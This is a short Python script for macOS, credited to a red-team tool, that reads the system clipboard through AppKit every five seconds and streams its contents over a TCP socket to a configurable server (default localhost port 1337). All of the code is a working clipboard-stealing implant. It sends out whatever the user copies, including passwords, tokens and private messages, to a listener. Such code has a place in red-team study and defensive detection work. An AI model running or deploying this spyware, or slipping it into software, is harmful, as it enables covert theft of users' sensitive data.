import AppKit
import socket
import time


# Credit to Cedric Owens for the Swift implementation
# https://github.com/cedowens/MacShellSwift/blob/master/MacShellSwift/Sources/MacShellSwift/main.swift
def get_clipboard_contents():
    try:
        clipboard = AppKit.NSPasteboard.generalPasteboard()
        clip_array = []

        for item in clipboard.pasteboardItems():
            for type_ in item.types():
                data = item.stringForType_(type_)
                if data:
                    clip_array.append(data)

        joined = ", ".join(clip_array)
        return joined
    except Exception as e:
        return f"Error grabbing clipboard contents: {e}"


def send_to_server(data, host="localhost", port=1337):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, port))
            s.sendall(data.encode("utf-8"))
    except Exception as e:
        print(f"Error sending data to server: {e}")


def main():
    while True:
        clipboard_contents = get_clipboard_contents()
        send_to_server(clipboard_contents)
        time.sleep(5)  # Adjust the interval as needed


if __name__ == "__main__":
    main()
